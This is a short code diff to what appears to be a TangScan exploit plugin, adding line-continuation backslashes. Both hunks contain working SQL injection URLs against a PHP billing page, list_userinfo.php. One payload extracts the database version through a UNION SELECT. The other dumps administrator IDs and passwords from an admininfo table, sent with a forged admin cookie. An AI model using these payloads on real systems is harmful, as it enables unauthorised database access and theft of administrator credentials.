@@ -68,7 +68,7 @@ class TangScan(TSExploit):
 
         re_version_pattern = re.compile(r'~~~(.+?)~~~', re.IGNORECASE | re.DOTALL | re.MULTILINE)
         cookies = {'cookie': 'admin'}
-        exp_url = ("{domain}/php/bill/list_userinfo.php?domain=fatezero.org&ok=1&cp=1 union "
+        exp_url = ("{domain}/php/bill/list_userinfo.php?domain=fatezero.org&ok=1&cp=1 union " \
                    "select concat(0x7e7e7e,@@version,0x7e7e7e),2,3,4,5%23".format(domain=self.option.url))
 
         try:
@@ -94,7 +94,7 @@ class TangScan(TSExploit):
 
         re_userinfo_pattern = re.compile(r'~~~(\w+?)\|\|\|(\w+?)~~~', re.IGNORECASE | re.DOTALL | re.MULTILINE)
         cookies = {'cookie': 'admin'}
-        exp_url = ("{domain}/php/bill/list_userinfo.php?domain=fatezero.org&ok=1&cp=1 union select concat(0x7e7e7e,"
+        exp_url = ("{domain}/php/bill/list_userinfo.php?domain=fatezero.org&ok=1&cp=1 union select concat(0x7e7e7e," \
                    "oid,0x7c7c7c,password,0x7e7e7e),2,3,4,5 from admininfo%23".format(domain=self.option.url))
 
         try:
